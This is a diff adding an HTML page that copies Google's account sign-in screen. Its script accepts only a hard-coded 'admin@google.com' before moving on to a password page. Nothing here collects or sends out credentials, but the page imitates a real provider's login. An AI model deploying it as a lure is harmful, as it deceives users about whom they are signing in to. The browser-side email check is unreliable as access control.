@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <main>
+      <div class="container">
+        <div class="form-container">
+          <div class="header">
+            <img src="logo.PNG" alt="logo" />
+            <h2>Sign in</h2>
+            <p>Use your Google Account</p>
+          </div>
+
+          <form
+            id="email-form"
+            onsubmit="return emailCheck()"
+            action="./pass.html"
+          >
+            <div class="form-first-line">
+              <div class="input-group">
+                <input type="email" id="email" class="input-area" required />
+                <label for="email" class="label">Email</label>
+              </div>
+            </div>
+
+            <div class="warning" id="warningMsg" style="display: none;">
+              <img src="./warning-icon.PNG" class="warning-icon" />
+              <span class="warning-text"> Enter the correct Admin email </span>
+            </div>
+            <p class="signin-text">Forgot email?</p>
+            <p class="username-suggestion-text">
+              Not your computer? Use Guest mode to sign in privately.
+            </p>
+
+            <p class="signin-text">Learn more</p>
+            <br />
+            <p class="signin-text">Create Account</p>
+            <input type="submit" value="Next" class="btn" />
+          </form>
+        </div>
+      </div>
+    </main>
+    <script>
+      const adminEmail = "admin@google.com",
+        warningMsg = document.getElementById("warningMsg"),
+        emailForm = document.getElementById("email-form");
+      function emailCheck() {
+        let inputEmail = document.getElementById("email").value;
+
+        if (inputEmail == adminEmail) {
+          return true;
+        } else {
+          warningMsg.style.display = "block";
+          document.querySelector(".label").style.display = "none";
+          document.getElementById("email").style.borderColor = "red";
+          return false;
+        }
+      }
+    </script>
+  </body>
+</html>
